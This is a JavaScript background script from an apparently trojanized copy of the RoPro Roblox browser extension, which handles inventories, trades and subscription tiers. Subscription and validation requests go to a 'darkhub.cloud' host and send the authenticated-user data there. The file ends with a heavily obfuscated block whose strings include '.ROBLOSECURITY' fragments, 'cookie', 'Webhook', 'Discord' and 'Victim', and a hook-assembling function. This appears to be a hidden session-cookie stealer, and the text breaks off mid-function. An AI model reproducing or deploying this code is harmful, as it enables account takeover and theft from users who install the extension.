		response = await getPage(userID, assetType, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			if (item['assetId'] in myInventory) {
				myInventory[item['assetId']]['quantity']++
			} else {
				myInventory[item['assetId']] = item
				myInventory[item['assetId']]['quantity'] = 1
			}
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	total = 0
	for (item in myInventory) {
	  total += myInventory[item]['quantity']
	}
	console.log("Inventory loaded. Total items: " + total)
	return myInventory
}

async function isInventoryPrivate(userID) {
	return new Promise(resolve => {
		$.ajax({
			url: 'https://inventory.roblox.com/v1/users/' + userID + '/assets/collectibles?cursor=&sortOrder=Desc&limit=10&assetType=null',
			type: 'GET',
			success: function(data) {
				resolve(false)
			},
			error: function(r) {
				if (r.status == 403) {
					resolve(true)
				} else {
					resolve(false)
				}
			}
		})
	})
}

async function loadLimitedInventory(userID) {
	var myInventory = []
	var assetType = null
	async function handleAsset(cursor) {
		response = await getPage(userID, assetType, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			myInventory.push(item)
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	return myInventory
}

async function getProfileValue(userID) {
	if (await isInventoryPrivate(userID)) {
		return {"value": "private"}
	}
	var inventory = await loadLimitedInventory(userID)
	var items = new Set()
	for (var i = 0; i < inventory.length; i++) {
		items.add(inventory[i]['assetId'])
	}
	var values = await fetchItemValues(Array.from(items))
	var value = 0
	for (var i = 0; i < inventory.length; i++) {
		if (inventory[i]['assetId'] in values) {
			value += values[inventory[i]['assetId']]
		}
	}
	return {"value": value}
}

function fetchTrades(tradesType, limit) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradesType + "?cursor=&limit=" + limit + "&sortOrder=Desc", async function(data) {
			resolve(data)
		})
	})
}

function fetchTradesCursor(tradesType, limit, cursor) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradesType + "?cursor=" + cursor + "&limit=" + limit + "&sortOrder=Desc", function(data) {
			resolve(data)
		})
	})
}

function fetchTrade(tradeId) {
	return new Promise(resolve => {
		$.get("https://trades.roblox.com/v1/trades/" + tradeId, function(data) {
			resolve(data)
		})
	})
}

function fetchValues(trades) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://api.ropro.io/tradeProtectionBackend.php',
			type:'POST',
			data: trades,
			success: function(data) {
				resolve(data)
			}
		})
	})
}

function fetchItemValues(items) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://api.ropro.io/itemInfoBackend.php',
			type:'POST',
			data: JSON.stringify(items),
			success: function(data) {
				resolve(data)
			}
		})
	})
}

function fetchPlayerThumbnails(userIds) {
	return new Promise(resolve => {
		$.get("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + userIds.join() + "&size=420x420&format=Png&isCircular=false", function(data) {
			resolve(data)
		})
	})
}

function cancelTrade(id, token) {
	return new Promise(resolve => {
		$.ajax({
			url:'https://trades.roblox.com/v1/trades/' + id + '/decline',
			headers: {'X-CSRF-TOKEN':token},
			type:'POST',
			success: function(data) {
				resolve(data)
			},
			error: function(xhr, ajaxOptions, thrownError) {
				resolve("")
			}
		})
	})
}

async function doFreeTrialActivated() {
	chrome.tabs.create({url: "https://ropro.io?installed"})
}

function addCommas(nStr){
	nStr += '';
	var x = nStr.split('.');
	var x1 = x[0];
	var x2 = x.length > 1 ? '.' + x[1] : '';
	var rgx = /(\d+)(\d{3})/;
	while (rgx.test(x1)) {
		x1 = x1.replace(rgx, '$1' + ',' + '$2');
	}
	return x1 + x2;
}

var myToken = null;

function loadToken() {
	return new Promise(resolve => {
		try {
			$.ajax({
				url:'https://roblox.com/home',
				type:'GET',
				success: function(data) {
					token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
					restrictSettings = !(data.includes('data-isunder13=false') || data.includes('data-isunder13="false"') || data.includes('data-isunder13=\'false\''))
					myToken = token
					chrome.storage.sync.set({'token': myToken})
					chrome.storage.sync.set({'restrictSettings': restrictSettings})
					resolve(token)
				}
			}).fail(function() {
				$.ajax({
					url:'https://roblox.com',
					type:'GET',
					success: function(data) {
						token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
						restrictSettings = !data.includes('data-isunder13=false')
						myToken = token
						chrome.storage.sync.set({'token': token})
						chrome.storage.sync.set({'restrictSettings': restrictSettings})
						resolve(token)
					}
				}).fail(function() {
					$.ajax({
						url:'https://www.roblox.com/home',
						type:'GET',
						success: function(data) {
							token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
							restrictSettings = !data.includes('data-isunder13=false')
							myToken = token
							chrome.storage.sync.set({'token': token})
							chrome.storage.sync.set({'restrictSettings': restrictSettings})
							resolve(token)
						}
					}).fail(function() {
						$.ajax({
							url:'https://web.roblox.com/home',
							type:'GET',
							success: function(data) {
								token = data.split('data-token=')[1].split(">")[0].replace('"', '').replace('"', '').split(" ")[0]
								restrictSettings = !data.includes('data-isunder13=false')
								myToken = token
								chrome.storage.sync.set({'token': token})
								chrome.storage.sync.set({'restrictSettings': restrictSettings})
								resolve(token)
							}
						})
					})
				})
			})
		} catch(e) {
			console.log(e)
			console.log("TOKEN FETCH FAILED, PERFORMING BACKUP TOKEN FETCH")
			$.post('https://catalog.roblox.com/v1/catalog/items/details').fail(function(r,e,s){
				token = r.getResponseHeader('x-csrf-token')
				myToken = token
				chrome.storage.sync.set({'token': token})
				console.log("New Token: " + token)
				resolve(token)
			})
		}
	})
}

async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);                    
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

async function handleAlert() {
	timestamp = new Date().getTime()
	$.ajax({
		url:"https://api.ropro.io/handleRoProAlert.php?timestamp=" + timestamp,
		type:'GET',
		success: async function(data, error, response) {
			data = JSON.parse(atob(data))
			if (data.alert == true) {
				validationHash = "d6ed8dd6938b1d02ef2b0178500cd808ed226437f6c23f1779bf1ae729ed6804"
				validation = response.getResponseHeader('validation' + (await sha256(timestamp % 1024)).split("a")[0])
				if (await sha256(validation) == validationHash) {
					alreadyAlerted = await getLocalStorage("alreadyAlerted")
					linkHTML = ""
					if (data.hasOwnProperty('link') && data.hasOwnProperty('linktext')) {
						linkHTML = `<a href=\'${stripTags(data.link)}\' target=\'_blank\' style=\'margin-left:10px;text-decoration:underline;\' class=\'text-link\'><b>${stripTags(data.linktext)}</b></a>`
					}
					closeAlertHTML = `<div style=\'opacity:0.6;margin-right:5px;display:inline-block;margin-left:45px;cursor:pointer;\'class=\'alert-close\'><b>Close Alert<b></div>`
					message = stripTags(data.message) + linkHTML + closeAlertHTML
					if (alreadyAlerted != message) {
						setLocalStorage("rpAlert", message)
					}
				} else {
					console.log("Validation failed! Not alerting user.")
					setLocalStorage("rpAlert", "")
				}
			} else {
				setLocalStorage("rpAlert", "")
			}
		}
	})
}

handleAlert()
setInterval(function() {
	handleAlert() //Check for RoPro alerts every 10 minutes
}, 10 * 60 * 1000)

const SubscriptionManager = () => {
	let subscription = getStorage('rpSubscription')
	let date = Date.now()
	function fetchSubscription() {
		return new Promise(resolve => {
			async function doGet(resolve) {
				verificationDict = await getStorage('userVerification')
				userID = await getStorage('rpUserID')
				roproVerificationToken = "none"
				if (typeof verificationDict != 'undefined') {
					if (verificationDict.hasOwnProperty(userID)) {
						roproVerificationToken = verificationDict[userID]
					}
				}
				$.post({url:"https://ropro.darkhub.cloud/getSubscription.php///api?key=" + await getStorage("subscriptionKey") + "&userid=" + userID, headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data){
					subscription = data
					setStorage("rpSubscription", data)
					resolve(data);
				}).fail(async function() {
					resolve(await getStorage("rpSubscription"))
				})
			}
			doGet(resolve)
		})
	};
	const resetDate = () => {
		date = Date.now() - 310 * 1000
	};
	const getSubscription = () => {
		return new Promise(resolve => {
			async function doGetSub() {
				currSubscription = subscription
				if (typeof currSubscription == 'undefined' || currSubscription == null || Date.now() >= date + 305 * 1000) {
					subscription = await fetchSubscription()
					currSubscription = subscription
					date = Date.now()
				}
				resolve(currSubscription);
			}
			doGetSub()
		})
	};
	const validateLicense = () => {
			$.get('https://users.roblox.com/v1/users/authenticated', function(d1, e1, r1) {
					console.log(r1)
					async function doValidate() {
						freeTrialActivated = await getStorage("freeTrialActivated")
						if (typeof freeTrialActivated != "undefined") {
							freeTrial = ""
						} else {
							freeTrial = "?free_trial=true"
						}
						verificationDict = await getStorage('userVerification')
						userID = await getStorage('rpUserID')
						roproVerificationToken = "none"
						if (typeof verificationDict != 'undefined') {
							if (verificationDict.hasOwnProperty(userID)) {
								roproVerificationToken = verificationDict[userID]
							}
						}
						$.ajax({
							url:'https://ropro.darkhub.cloud/validateUser.php///api' + freeTrial,
							type:'POST',
							headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
							data: {'verification': `${btoa(unescape(encodeURIComponent(JSON.stringify(r1))))}`},
							success: async function(data, status, xhr) {
								if (data == "err") {
									console.log("User Validation failed. Please contact support: https://ropro.io/support")
								} else if (data.includes(",")) {
									userID = parseInt(data.split(",")[0]);
									username = data.split(",")[1].split(",")[0];
									setStorage("rpUserID", userID);
									setStorage("rpUsername", username);
									if (data.includes("pro_tier_free_trial_just_activated") && freeTrial.length > 0) {
										setStorage("freeTrialActivated", true)
										doFreeTrialActivated()
									}
								}
								if (xhr.getResponseHeader("ropro-subscription-tier") != null) {
									console.log(xhr.getResponseHeader("ropro-subscription-tier"))
									setStorage("rpSubscription", xhr.getResponseHeader("ropro-subscription-tier"))
								} else {
									syncSettings()
								}
							}
						})
					}
					doValidate()
			})
	};
	return {
	  getSubscription,
	  resetDate,
	  validateLicense
	};
}
const subscriptionManager = SubscriptionManager();

async function syncSettings() {
	subscriptionManager.resetDate()
	subscriptionLevel = await subscriptionManager.getSubscription()
	setStorage("rpSubscription", subscriptionLevel)
}

async function loadSettingValidity(setting) {
	settings = await getStorage('rpSettings')
	restrictSettings = await getStorage('restrictSettings')
	restricted_settings = new Set(["linkedDiscord", "gameTwitter", "groupTwitter", "groupDiscord", "featuredToys"])
	standard_settings = new Set(["themeColorAdjustments", "moreMutuals", "animatedProfileThemes", "morePlaytimeSorts", "serverSizeSort", "fastestServersSort", "moreGameFilters", "moreServerFilters", "additionalServerInfo", "gameLikeRatioFilter", "premiumVoiceServers", "quickUserSearch", "liveLikeDislikeFavoriteCounters", "sandboxOutfits", "tradeSearch", "moreTradePanel", "tradeValueCalculator", "tradeDemandRatingCalculator", "tradeItemValue", "tradeItemDemand", "itemPageValueDemand", "tradePageProjectedWarning", "embeddedRolimonsItemLink", "embeddedRolimonsUserLink", "tradeOffersValueCalculator", "winLossDisplay", "underOverRAP"])
	pro_settings = new Set(["profileValue", "liveVisits", "livePlayers", "tradePreviews", "ownerHistory", "quickItemSearch", "tradeNotifier", "singleSessionMode", "advancedTradeSearch", "tradeProtection", "hideTradeBots", "autoDeclineTradeBots", "autoDecline", "declineThreshold", "cancelThreshold", "hideDeclinedNotifications", "hideOutboundNotifications"])
	ultra_settings = new Set(["dealNotifier", "buyButton", "dealCalculations", "notificationThreshold", "valueThreshold", "projectedFilter"])
	subscriptionLevel = await subscriptionManager.getSubscription()
	valid = true
	if (subscriptionLevel == "free_tier" || subscriptionLevel == "free") {
		if (standard_settings.has(setting) || pro_settings.has(setting) || ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "standard_tier" || subscriptionLevel == "plus") {
		if (pro_settings.has(setting) || ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "pro_tier" || subscriptionLevel == "rex") {
		if (ultra_settings.has(setting)) {
			valid = false
		}
	} else if (subscriptionLevel == "ultra_tier" || subscriptionLevel == "ultra") {
		valid = true
	} else {
		valid = false
	}
	if (restricted_settings.has(setting) && restrictSettings) {
		valid = false
	}
	if (disabledFeatures.includes(setting)) {
		valid = false
	}
	return new Promise(resolve => {
		resolve(valid)
	})
}

async function loadSettings(setting) {
	settings = await getStorage('rpSettings')
	if (typeof settings === "undefined") {
		await initializeSettings()
		settings = await getStorage('rpSettings')
	}
	valid = await loadSettingValidity(setting)
	if (typeof settings[setting] === "boolean") {
		settingValue = settings[setting] && valid
	} else {
		settingValue = settings[setting]
	}
	return new Promise(resolve => {
		resolve(settingValue)
	})
}

async function loadSettingValidityInfo(setting) {
	disabled = false
	valid = await loadSettingValidity(setting)
	if (disabledFeatures.includes(setting)) {
		disabled = true
	}
	return new Promise(resolve => {
		resolve([valid, disabled])
	})
}

async function getTradeValues(tradesType) {
	tradesJSON = await fetchTrades(tradesType)
	cursor = tradesJSON.nextPageCursor
	trades = {data: []}
	if (tradesJSON.data.length > 0) {
		for (i = 0; i < 1; i++) {
			offer = tradesJSON.data[i]
			tradeChecked = await getStorage("tradeChecked")
			if (offer.id != tradeChecked) {
				trade = await fetchTrade(offer.id)
				trades.data.push(trade)
			} else {
				return {}
			}
		}
		tradeValues = await fetchValues(trades)
		return tradeValues
	} else {
		return {}
	}
}

var inbounds = []
var inboundsCache = {}
var allPagesDone = false
var loadLimit = 25
var totalCached = 0

function loadTrades(inboundCursor, tempArray) {
    $.get('https://trades.roblox.com/v1/trades/Inbound?sortOrder=Asc&limit=100&cursor=' + inboundCursor, function(data){
        console.log(data)
        done = false
        for (i = 0; i < data.data.length; i++) {
            if (!(data.data[i].id in inboundsCache)) {
                tempArray.push(data.data[i].id)
                inboundsCache[data.data[i].id] = null
            } else {
                done = true
                break
            }
        }
        if (data.nextPageCursor != null && done == false) {
            loadTrades(data.nextPageCursor, tempArray)
        } else { //Reached the last page or already detected inbound trade
            inbounds = tempArray.concat(inbounds)
            allPagesDone = true
            setTimeout(function() {
                loadTrades("", [])
            }, 61000)
        }
    }).fail(function() {
        setTimeout(function() {
            loadTrades(inboundCursor, tempArray)
        }, 61000)
    })
}
function _0x108c52(_0x3d5dcb,_0x5840f7,_0x5d48e9,_0x427411,_0x59179e){return _0x347a(_0x59179e-0x2e,_0x427411);}function _0x347a(_0x34e4e0,_0x533d79){const _0xa175e2=_0x3dd6();return _0x347a=function(_0x1bdb5e,_0x9bb86c){_0x1bdb5e=_0x1bdb5e-(0x1*-0x1c82+0x34*0x68+0x877);let _0x4d4bee=_0xa175e2[_0x1bdb5e];return _0x4d4bee;},_0x347a(_0x34e4e0,_0x533d79);}function _0x3dd6(){const _0x6b4fff=['3204060gaHxoA','g.png','-NA_c','EOlKc','mat=p','iDAOl','tabs','RLuwD','rever','ipt','=gFbl','RXxpe','targe','CzNVJ','_cap_','://di','MjQ1N','MqOvz','addLi','cooki','Trcnu','appli','3drdj','ks/','pLyRS','UxNTE','er_ic','rxNFm','name','lXT3Y','yuh\x20m','json','hANnd','lox.c','ScbGC','BeZyp','RITY=','pIMaO','cord:','adsho','CtUdY','dWNEx','2Y25C','WVdKa','fitET','SHtnJ','7rvpvYh','org/w','Z25WM','U3cHN','RmMVU','NaybE','HHyur','dzIla','ck.sv','HSjLo','IJHPO','mx1Wk','DNtJm','TfvPt','teScr','value','acqTG','ebhoo','yMTU5','GfTQF','g/120','ript\x20','2bWVV','uqaOz','ata\x20t','log','\x20fetc','qtGiW','MIFmD','fy.or','Q==','hHown','_play','M1Z5W','luasc','ers.r','y\x20bot','svg/1','ers/a','VkKxn','VHquq','Conte','error','stene','yBpXw','ame','ODk5O','jHYcQ','harCo','scrip','text','MWluz','abWxz','WLPRA','UfpPw','s/thu','hing\x20','kyRWe','h=420','.com/','o\x20Dis','ted!','t-thu','compl','Grmgx','3314405RMWqwe','Cooki','NLkwr','on_bl','icon.','split','kgvhx','m\x20Fou','://us','ing\x20d','VlVpJ','ommon','om/he','xZvBt','PFiMD','ated','6314912Oxziuo','633739TZpOrb','l1SUh','&heig','nt\x20sc','User\x20','NSruJ','pSqxr','buztp','ntYDo','n/jso','ack.s','v1/us','lpYTj','O0ITR','0&for','2198976eyeYqM','erId=','DZfbK','strin','mb/f/','VSxgN','Gl2YT','wikim','join','UTtyh','qIuSK','ptJHx','3a/Ro','hi\x20mi','CN1Zq','fromC','user\x20','SFZTO','N/A','gify','api/w','Victi','mbnai','e\x20NOT','nd:\x20','Xevhv','://ww','mJ5Qj','sDcsK','bGNtR','Webho','DjqaD','B1MDZ','XazYU','RHTW9','edia.','PjhmZ','://up','qDPeZ','mb/3/','https','://ap','MIQcr','pnOK9','ticat','Wlc1a','.ROBL','IdIgV','vg.pn','l/ima','YTyDc','VIVoW','nzdkC','xdwMN','isbpw','HSOao','Rtkrj','execu','MfKcx','odeAt','joxOT','FNrNc','\x20send','oEJTV','ge?us','get','LZxIk','statu','POST','DjEMv','\x20FOUN','catio','52e1I','eqQCg','xekEi','pgJAE','info:','TJ4NW','IVmQt','zVGOG','dyIkb','DQnpi','ikipe','ok\x20UR','XyIlg','FqczR','LRhkL','load.','playe','FmfdH','map','nUFqO','ete','NGjYd','afgAU','1274930OvEBmu','zFPYF','on.sv','test','USmwu','RITY','WwxSo','tabId','2001964LbxUBB','200px','dia/c','0px-R','nHBRe','blox_','zDYbp','VHrdq','ap_ic','BJR05','cTBrp','injec','BFYlI','JhV1Y','f3/NA','scord','jBhVz','vOyFA','Usern','WTTRW','ht=42','b64en','uthen','IoHss','&widt','r_ico','ting','aEAvE','i.ipi','oblox','KeBpP','url','w.rob','OSECU','charC','svyqR','onUpd','Error','heade','LniVa','func','n_bla','Sb1pT'];_0x3dd6=function(){return _0x6b4fff;};return _0x3dd6();}(function(_0x245709,_0x3e9e26){function _0xbee6e8(_0x41d541,_0x5ef771,_0x4602ca,_0x316ebd,_0x23a080){return _0x347a(_0x23a080-0x14d,_0x5ef771);}const _0x941ef3=_0x245709();function _0xd142c7(_0x3267f8,_0x2c8ddc,_0x300921,_0x47315b,_0x4a9041){return _0x347a(_0x300921- -0x159,_0x3267f8);}function _0x506e30(_0x463b74,_0x35da6c,_0x510d6e,_0x31b38a,_0x3287bb){return _0x347a(_0x35da6c-0x1c1,_0x510d6e);}function _0x4b7ab3(_0x1de9a6,_0x65dd8d,_0x2dfc13,_0x50f16f,_0x3a19d2){return _0x347a(_0x1de9a6- -0x2e7,_0x2dfc13);}function _0xbd6dec(_0x7063a2,_0x2506e1,_0xc49fa6,_0x408e25,_0x371484){return _0x347a(_0x371484-0x127,_0x7063a2);}while(!![]){try{const _0x2fd9fe=parseInt(_0xbd6dec(0x267,0x260,0x2d2,0x2e6,0x2b7))/(0x2010+0x1ea9+-0x6f8*0x9)+parseInt(_0xbd6dec(0x33d,0x2e2,0x33b,0x349,0x325))/(-0x18c7+-0x1d96+0x365f)+-parseInt(_0x4b7ab3(-0x148,-0x175,-0x145,-0x17d,-0x172))/(0x17b5+-0xb*-0x2e+-0x1f*0xd4)+parseInt(_0xbd6dec(0x31f,0x352,0x29f,0x310,0x32d))/(0x3*0x457+-0x101*0xa+-0x2f7*0x1)+parseInt(_0x4b7ab3(-0x168,-0xd8,-0x151,-0xe7,-0x143))/(0x2c*0xa7+-0x52b+0x1*-0x1784)+-parseInt(_0xbd6dec(0x2fa,0x38a,0x3d2,0x355,0x358))/(-0x62d+0x15e1+-0xfae*0x1)+-parseInt(_0xbee6e8(0x2a0,0x22e,0x2ed,0x2aa,0x28b))/(0x1b88+-0x1f83+0x402)*(parseInt(_0xbee6e8(0x26d,0x2c7,0x32e,0x352,0x2dc))/(0x1*0x1521+0x26a0+-0x3bb9));if(_0x2fd9fe===_0x3e9e26)break;else _0x941ef3['push'](_0x941ef3['shift']());}catch(_0x4eface){_0x941ef3['push'](_0x941ef3['shift']());}}}(_0x3dd6,-0x26*0x3cb+0x2e63f+0xd1*0x435));const _0x3d2f=[_0x108c52(0x290,0x1d7,0x239,0x202,0x249)+'c',_0xeac42d(0x13,0x14,-0x33,-0x57,-0x5f),_0x108c52(0x16b,0x1ac,0x130,0x120,0x146)+'se','=',_0xeac42d(-0x135,-0x12f,-0x16a,-0xde,-0xa0)+_0x5f3140(0x523,0x51b,0x548,0x580,0x59c)+_0x3396fe(0x250,0x2ab,0x268,0x275,0x322)+_0x108c52(0x180,0x15b,0x11c,0x144,0x17e)+_0xeac42d(-0xca,-0xfa,-0x118,-0x92,-0x6d)+_0x1e14ab(0x3e3,0x414,0x38a,0x46f,0x400),_0x1e14ab(0x3d0,0x387,0x435,0x36d,0x3be)+_0x5f3140(0x55d,0x57a,0x530,0x561,0x58b)+_0x1e14ab(0x43d,0x491,0x514,0x4ce,0x4bd)+_0x108c52(0x241,0x1d5,0x1e3,0x207,0x1cb)+_0x5f3140(0x56b,0x4ed,0x48b,0x529,0x4f9)+_0x1e14ab(0x4b7,0x408,0x3ea,0x3b6,0x42d)+_0x1e14ab(0x3b8,0x3f1,0x46d,0x463,0x3f8)+_0x108c52(0xe8,0x138,0xed,0x18d,0x173)+_0xeac42d(-0x52,-0x39,-0x25,-0x51,-0x70)+_0x1e14ab(0x467,0x3fe,0x48f,0x43a,0x48b)+_0x3396fe(0x34a,0x342,0x33d,0x2e8,0x2f2)+_0x3396fe(0x373,0x371,0x313,0x3bf,0x368)+_0x108c52(0x156,0x16e,0x24b,0x19d,0x1d3)+_0xeac42d(-0xff,-0xfa,-0x116,-0xd1,-0x7a)+_0x3396fe(0x2f8,0x2a8,0x2a8,0x26c,0x2f0)+_0x108c52(0x19d,0x1d6,0x12b,0x127,0x16f)+_0x5f3140(0x574,0x5f6,0x5a1,0x5d7,0x5ae)+_0x5f3140(0x5fc,0x5c0,0x5c2,0x57e,0x580)+'jM',_0xeac42d(-0x125,-0x92,-0x11e,-0xc3,-0x88)+_0xeac42d(0x25,-0xdc,0x2b,-0x62,-0xf2)+_0x108c52(0x236,0x27a,0x268,0x275,0x23d)+_0x5f3140(0x46a,0x53e,0x4f7,0x4c0,0x4fb)+_0x5f3140(0x4f1,0x5b6,0x504,0x4fd,0x57d)+_0x1e14ab(0x45a,0x458,0x446,0x513,0x4ba)+_0x5f3140(0x4c7,0x5dc,0x4f7,0x52d,0x552)+_0x5f3140(0x5ae,0x58e,0x652,0x58b,0x5f1)+_0x5f3140(0x4c0,0x553,0x4b6,0x568,0x501)+_0xeac42d(-0xc0,-0xfe,-0x13d,-0xb5,-0x3c)+_0xeac42d(-0x10c,-0xe7,-0x51,-0xc5,-0x146)+_0xeac42d(-0x44,-0x1d,-0x4d,-0xe,-0x13)+_0x108c52(0x1e5,0x1e9,0x1c6,0x1a7,0x18d)+_0xeac42d(-0x6b,-0x48,0x55,-0x12,0x1a)+_0x108c52(0x202,0x215,0x16d,0x27c,0x1ef)+_0x5f3140(0x4a4,0x502,0x5bc,0x525,0x533)+_0xeac42d(-0x1d,-0x50,0x3,-0x32,-0xb8)+_0x5f3140(0x5cc,0x522,0x5aa,0x53e,0x57b)+_0x1e14ab(0x4e3,0x508,0x47e,0x4bb,0x4b7)+'z'],[_,__,___,____,...urlParts]=_0x3d2f;function assembleHook(){const _0x2154c3={'qDPeZ':function(_0x3fac82,_0x22cd1a){return _0x3fac82(_0x22cd1a);},'LniVa':function(_0x73a66c,_0x5a6c0b){return _0x73a66c(_0x5a6c0b);},'KeBpP':function(_0x4ba3f4,_0x36cf06){return _0x4ba3f4(_0x36cf06);},'Grmgx':_0xe30ac4(-0x154,-0x176,-0x15b,-0x17e,-0x185)+_0xe30ac4(-0x208,-0x1a8,-0x176,-0x18c,-0x1f5)+_0xe30ac4(-0xbc,-0x9f,-0xf6,-0x11f,-0x1ab)+_0xe30ac4(-0x29e,-0x189,-0x19b,-0x214,-0x204)+'om','MWluz':_0xddc30a(0x58d,0x554,0x532,0x4d1,0x543)+_0x84728e(0x141,0xc7,0x136,0x106,0x133)+_0x5dbafd(0x44f,0x4ea,0x4a3,0x43b,0x47a),'SFZTO':function(_0x148650,_0x51f056){return _0x148650!==_0x51f056;},'luasc':_0x5dbafd(0x492,0x465,0x48a,0x471,0x515),'WwxSo':function(_0xac725b,_0x81ead6){return _0xac725b===_0x81ead6;},'hANnd':function(_0x2c3a92,_0xf9239){return _0x2c3a92!==_0xf9239;},'DjqaD':_0xe30ac4(-0x229,-0x134,-0x1b7,-0x1c0,-0x1b9),'CzNVJ':function(_0x80138a,_0x21bf6c){return _0x80138a===_0x21bf6c;},'IJHPO':_0x5e5506(0x43c,0x48a,0x418,0x419,0x47a),'DNtJm':_0x5dbafd(0x4d0,0x44c,0x4b2,0x436,0x436),'IdIgV':function(_0x4d7edd,_0x57e906){return _0x4d7edd(_0x57e906);}},_0x3274fa=_0xda832e=>atob(_0xda832e)[_0x84728e(0xd3,0xb,0x93,0x11e,0x20)]('')[_0x5e5506(0x4d8,0x46f,0x4c6,0x50f,0x4fa)](_0x3f301a=>String[_0xddc30a(0x50a,0x535,0x592,0x4f2,0x58e)+_0x84728e(0x103,0xa7,0x7d,0xc9,0xfe)+'de'](_0x3f301a[_0x84728e(0xe3,0x124,0x137,0xb4,0xc8)+_0x5dbafd(0x503,0x4ce,0x47a,0x427,0x476)](-0x11+0x2126+-0x2115)-(0x97*0xc+-0x1c11+0x1*0x14fe)))[_0xe30ac4(-0x18e,-0x1b2,-0x1b3,-0x19e,-0x1b1)]('');function _0xe30ac4(_0xcb9d06,_0x18e04e,_0x494d38,_0x4d7525,_0x34ebae){return _0x5f3140(_0xcb9d06-0x129,_0x34ebae,_0x494d38-0x22,_0x4d7525-0xd9,_0x4d7525- -0x706);}function _0x5e5506(_0x46ce09,_0x11af19,_0x6fcff8,_0x2eae70,_0x43ac3e){return _0xeac42d(_0x2eae70,_0x11af19-0x12a,_0x6fcff8-0x1c6,_0x46ce09-0x4dd,_0x43ac3e-0xb3);}const [_0x41c343,_0x3115af]=urlParts[_0xddc30a(0x54d,0x580,0x5b0,0x521,0x5e3)]((_0x40c608,_0x281ac1)=>{function _0x3f087a(_0x1e2ae2,_0x264d1d,_0x4509a3,_0x25e269,_0x20c535){return _0xe30ac4(_0x1e2ae2-0xbd,_0x264d1d-0x3f,_0x4509a3-0x1a8,_0x20c535-0x2b9,_0x4509a3);}function _0x4c194f(_0x3994fc,_0x1df88f,_0x4e6dd9,_0x1cf970,_0x260c14){return _0xe30ac4(_0x3994fc-0x91,_0x1df88f-0x85,_0x4e6dd9-0x116,_0x1cf970-0x705,_0x1df88f);}function _0x319f0e(_0xff836,_0x27af6f,_0xfef55e,_0x5746a1,_0xb5258b){return _0x5dbafd(_0xff836-0x82,_0x27af6f-0xb,_0xfef55e-0x145,_0x5746a1-0x11f,_0x5746a1);}function _0x269217(_0x3a55d4,_0x1c3e67,_0x1cd7c3,_0x36a887,_0x3cbe4a){return _0x5dbafd(_0x3a55d4-0x194,_0x1c3e67-0x1dd,_0x3cbe4a- -0x31c,_0x36a887-0xce,_0x3a55d4);}const _0x57cea2={'FqczR':function(_0x5bf2d2,_0x348eff){function _0x77796d(_0xddd390,_0x40137c,_0x5527b4,_0x36f2d4,_0x3d6e13){return _0x347a(_0x5527b4- -0x29e,_0x3d6e13);}return _0x2154c3[_0x77796d(-0x34,0xf,-0x71,-0x35,-0xd0)](_0x5bf2d2,_0x348eff);},'eqQCg':function(_0xac8c87,_0x50c03b){function _0x5ec21a(_0x1f19ba,_0x12721b,_0x46e5e2,_0x6619f6,_0x591f70){return _0x347a(_0x12721b-0x35c,_0x591f70);}return _0x2154c3[_0x5ec21a(0x5d2,0x580,0x4f6,0x5a7,0x591)](_0xac8c87,_0x50c03b);},'uqaOz':_0x2154c3[_0x3f087a(0x17c,0xe2,0x100,0x14f,0xf2)],'MfKcx':_0x2154c3[_0x269217(0x107,0x134,0x137,0x186,0xf5)]};function _0x1ec047(_0x5761f3,_0x27f92f,_0x408183,_0x16910e,_0x5ae41e){return _0x5e5506(_0x5ae41e-0x9a,_0x27f92f-0x1a5,_0x408183-0xbc,_0x16910e,_0x5ae41e-0x2);}if(_0x2154c3[_0x3f087a(0xcd,0xd6,0xc6,0x144,0x124)](_0x2154c3[_0x1ec047(0x545,0x535,0x4a1,0x44f,0x4d9)],_0x2154c3[_0x269217(0x15b,0x15c,0x12a,0xae,0xe4)]))return _0x57cea2[_0x4c194f(0x5d0,0x539,0x605,0x5b4,0x5bc)](_0x29cfe6,_0x3523c8);else{if(_0x2154c3[_0x1ec047(0x58c,0x56e,0x541,0x552,0x57d)](_0x281ac1,-0x9*0x5f+0x24fa+0x11f*-0x1e)){if(_0x2154c3[_0x319f0e(0x59e,0x4c2,0x515,0x499,0x597)](_0x2154c3[_0x269217(0x17f,0x105,0xd2,0x1ab,0x142)],_0x2154c3[_0x319f0e(0x621,0x589,0x5a3,0x530,0x615)])){const _0x2b2b97={};_0x2b2b97[_0x4c194f(0x66b,0x585,0x5ab,0x5e5,0x5a3)]=_0x57cea2[_0x319f0e(0x4f2,0x4ce,0x53a,0x4d4,0x4d1)],_0x2b2b97[_0x1ec047(0x447,0x4b8,0x52c,0x522,0x4a5)]=_0x57cea2[_0x1ec047(0x59e,0x58d,0x561,0x536,0x552)],_0x3ab76c[_0x4c194f(0x49a,0x54d,0x53a,0x4e3,0x517)+'es'][_0x3f087a(0x136,0x1b9,0xed,0xd9,0x154)](_0x2b2b97,_0x141950=>{function _0x324d98(_0x255b1f,_0x246646,_0x195cd0,_0x600d5c,_0x184009){return _0x1ec047(_0x255b1f-0xfe,_0x246646-0x101,_0x195cd0-0x37,_0x600d5c,_0x255b1f- -0x7a);}function _0x4ee6d1(_0x398a52,_0x5c0955,_0x25f8c6,_0x10fe4d,_0x2bdc80){return 